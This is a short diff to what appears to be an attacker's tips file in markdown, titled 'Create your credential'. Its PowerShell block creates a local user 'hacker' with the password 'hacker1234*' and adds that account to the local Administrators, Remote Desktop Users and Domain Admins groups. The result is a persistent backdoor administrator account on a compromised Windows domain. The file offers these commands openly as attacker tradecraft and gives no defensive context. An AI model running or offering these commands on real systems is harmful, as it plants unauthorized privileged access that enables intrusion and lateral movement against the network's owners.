@@ -3,9 +3,10 @@
 ## TIP 1 - Create your credential :D
 
 ```powershell
-net user hacker hacker /add
+net user hacker hacker1234* /add
 net localgroup administrators hacker /add
-net group "Domain Admins" hacker /ADD /DOMAIN
+net localgroup "Remote Desktop Users" hacker /add
+net group "Domain Admins" hacker /add /domain
 ```
 
 Some info about your user
